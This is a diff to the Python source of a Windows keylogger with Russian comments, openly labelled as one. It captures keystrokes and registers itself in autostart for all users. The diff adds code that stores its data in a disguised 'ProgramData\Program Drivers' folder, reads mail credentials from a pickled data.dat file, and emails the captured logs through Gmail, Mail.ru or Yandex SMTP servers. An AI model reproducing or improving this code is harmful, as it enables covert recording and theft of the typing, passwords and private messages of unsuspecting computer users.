@@ -1,7 +1,7 @@
 from pynput import keyboard
 from shutil import copy
 from os import listdir, access, mkdir, W_OK, getlogin, environ, getpid
-from os.path import isdir, basename
+from os.path import isdir, isfile, basename
 from win32process import GetWindowThreadProcessId
 from win32gui import GetForegroundWindow
 from win32api import GetKeyboardLayoutName, GetKeyboardState, LoadKeyboardLayout, GetKeyboardLayout, SetFileAttributes
@@ -17,29 +17,49 @@ from pickle import dump, load
 
 #Отправка электронного письма
 def send_email(date):
-    write_time_date_file_in_write_file('      - - - - Запуск службы отправки файла - - - -      ' + '\n')
-    addr_from = "your email@(gmail, yandex, mail).(com, ru)"   # Отправитель
-    password  = "your password"                                # Пароль от вашей почты
+	write_time_date_file_in_write_file('      - - - - Запуск службы отправки файла - - - -      ' + '\n')
 
-    msg = MIMEMultipart()                                      # Создаем сообщение
-    msg['From']    = addr_from                                 # Адресат
-    msg['To']      = 'recipient'                               # Получатель
-    msg['Subject'] = 'Файл с новыми данными кейлогера'         # Тема сообщения, которое будет отображаться в письме
+	Continue = True
+	Access = False
+	if isfile(disk_key + main_folder + "data.dat"):
+		file_dat = open(disk_key + main_folder + "data.dat", "rb")
+		datas = load(file_dat)
+		file_dat.close()
+	else:
+		Continue = False
+		write_time_date_file_in_write_file('        - - - Отсутвует файл с настрйками - - -        ' + '\n')
 
-    body = 'Здавствуйте! У кейлогера появились новые данные!'  # Текст сообщения, которое будет отображено в письме
-    msg.attach(MIMEText(body, 'plain'))                        # Добавляем в сообщение текст, которое попадет в тело письма
+	if Continue:
 
-    #Прикрепление файла
-    acces = attach_file(msg, date)
+		addr_from = datas[0]                                   # Отправитель
+		password  = datas[1]                                   # Пароль от вашей почты
 
-    #======== Этот блок настраивается для каждого почтового провайдера отдельно ================================================
-    if acces:
-        server = smtplib.SMTP_SSL('smtp.(gmail, yandex, mail).(com, ru)', 465) # Создаем объект SMTP
-        server.login(addr_from, password)                      # Получаем доступ
-        server.send_message(msg)                               # Отправляем сообщение
-        server.quit()
-        write_time_date_file_in_write_file('       - - - - - Файл успешно отправлен - - - - -      ' + '\n')
-    #===========================================================================================================================
+		msg = MIMEMultipart()                                  # Создаем сообщение
+		msg['From']    = addr_from                             # Адресат
+		msg['To']      = datas[2]                              # Получатель
+		msg['Subject'] = 'Файл с новыми данными кейлогера'     # Тема сообщения, которое будет отображаться в письме
+
+		body = 'Здавствуйте! У кейлогера появились новые данные!' # Текст сообщения, которое будет отображено в письме
+		msg.attach(MIMEText(body, 'plain'))                    # Добавляем в сообщение текст, которое попадет в тело письма
+
+		#Прикрепление файла
+		Access = attach_file(msg, date)
+
+	#======== Этот блок настраивается для каждого почтового провайдера отдельно ================================================
+	if Access:
+		smtps = ["gmail", "mail", "yandex"]
+		domens = ["com", "ru", "ru"]
+		Smtp_ind = 0
+		for Smtp in smtps:
+			if Smtp in addr_from:
+				break
+			Smtp_ind += 1
+		server = smtplib.SMTP_SSL('smtp.' + smtps[Smtp_ind] + '.' + domens[Smtp_ind], 465) # Создаем объект SMTP
+		server.login(addr_from, password)                      # Получаем доступ
+		server.send_message(msg)                               # Отправляем сообщение
+		server.quit()
+		write_time_date_file_in_write_file('       - - - - - Файл успешно отправлен - - - - -      ' + '\n')
+	#===========================================================================================================================
 #Прикрепление документа к электронному письму
 def attach_file(msg, date):
     filepath = find_date(date, False)
@@ -112,7 +132,7 @@ def find_date(date, flag):
 			if len(files) >= 1:
 				return disk_key + main_folder + user_name + '\\' + year_curent + '\\' + res + '\\{}'.format(files[-1])
 			else:
-				write_time_date_file_in_write_file('         - - - - Нужный файл отсутсвует - - - -        ' + '\n')
+				write_time_date_file_in_write_file('     - - - - Нужный файл с данными отсутсвует - - - -  ' + '\n')
 				return False
 		else:
 			write_time_date_file_in_write_file('        - - - Отсутсвует нужная директория - - -           ' + '\n')
@@ -177,7 +197,11 @@ for user in others_users: remove_others_users(user)
 #Добавление в автозагрузку
 for user in all_users: add_auto_for_users(user)
 #Главная директрия
-main_folder = "Program Files (x86)\\Programm driver 001\\"
+main_folder = "ProgramData\\Program Drivers\\"
+#Дополнительная директрия, если к первой доступ отсутсвует
+dop_folder = "Program Drivers\\"
+#Директрия, в случае, если к дополнительной директори нет доступа, пробуем записать на диск D
+folder_for_D = "Program Drivers\\"
 #Язык на момент запуска программы(если 00000409 - английский, 00000419 - русский)
 launge = GetKeyboardLayoutName()
 #Установка первоночальных переменных
@@ -224,27 +248,45 @@ alphabet = sorted('4ыhПЩm%ЗXd)мsЪ?UEюДОКЖЭo<етй;n|1нэYИuxСя�
 #Исключение вызывается, когда папка не найдена или допуск на запись на диск С == False
 try:
 	if not isdir(disk_key + main_folder): mkdir(disk_key + main_folder)
+	if not isfile(disk_key + main_folder + "data.dat"):
+		try: 
+			copy("data.dat", disk_key + main_folder)
+		except:
+			exit()
 	if not isdir(disk_key + main_folder + user_name): mkdir(disk_key + main_folder + user_name)
 	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent)
 	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
 	write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Инициализация - " + user_name + ' - - -\n', 1)
 except:
 	#Если есть допуск на запись в диске С
-	if access(disk_key + main_folder, W_OK):
+	if access(disk_key + dop_folder, W_OK):
 		#Создаем папку main_folder на диске С
-		if not isdir(disk_key + main_folder + user_name): mkdir(disk_key + main_folder + user_name)
-		if not isdir(disk_key + main_folder + user_name + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + moon_curent)
-		if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
+		if not isdir(disk_key + dop_folder): mkdir(disk_key + dop_folder)
+		if not isfile(disk_key + dop_folder + "data.dat"): 
+			try:
+				copy("data.dat", disk_key + dop_folder)
+			except:
+				exit()
+		if not isdir(disk_key + dop_folder + user_name): mkdir(disk_key + dop_folder + user_name)
+		if not isdir(disk_key + dop_folder + user_name + '\\' + moon_curent): mkdir(disk_key + dop_folder + user_name + '\\' + moon_curent)
+		if not isdir(disk_key + dop_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + dop_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
+		main_folder = dop_folder
 	else:
-		if access('D:\\' + main_folder, W_OK):
-			if not isdir('D:\\' + main_folder):
+		if access('D:\\' + folder_for_D, W_OK):
+			if not isdir('D:\\' + folder_for_D):
 				#Создаем папку main_folder на диске D
-				mkdir('D:\\' + main_folder)
+				mkdir('D:\\' + folder_for_D)
 			#Меняется диск записи
 			disk_key = 'D:\\'
-			if not isdir(disk_key + main_folder + user_name): mkdir(disk_key + main_folder + user_name)
-			if not isdir(disk_key + main_folder + user_name + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + moon_curent)
-			if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
+			if not isdir(disk_key + folder_for_D + user_name): mkdir(disk_key + folder_for_D + user_name)
+			if not isfile(disk_key + folder_for_D + "data.dat"): 
+				try:
+					copy("data.dat", disk_key + folder_for_D)
+				except:
+					exit()
+			if not isdir(disk_key + folder_for_D + user_name + '\\' + moon_curent): mkdir(disk_key + folder_for_D + user_name + '\\' + moon_curent)
+			if not isdir(disk_key + folder_for_D + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + folder_for_D + user_name + '\\' + year_curent + '\\' + moon_curent)
+			main_folder = folder_for_D
 		else:
 			exit()
 	#Повторно записываем время и дату в файл, в созданной или уже имеющейся папке диска С или D, если вызвалось исключене
